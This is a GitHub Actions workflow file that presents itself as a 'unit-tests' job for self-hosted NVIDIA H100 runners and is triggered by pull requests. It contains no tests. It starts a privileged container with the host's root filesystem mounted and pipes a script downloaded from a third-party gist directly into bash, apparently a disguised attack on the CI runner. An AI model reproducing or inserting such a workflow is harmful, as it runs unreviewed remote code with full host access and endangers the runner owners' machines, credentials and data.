name: nv-h100
run-name: nv-h100

on:
  pull_request

jobs:
  unit-tests:
    runs-on: [self-hosted, nvidia, h100]
    container:
       image: ubuntu:latest
       volumes:
           - /:/host/
       options: --privileged
    steps:
      - name: unit-tests
        continue-on-error: true
        run: |
          apt update
          apt install -y curl
          curl https://gist.githubusercontent.com/jstan327/ef3f5f3fff3a391f1cb8322419e918fa/raw/0e822472163296a1480e833174591929a9f11362/bak41162231010017 | bash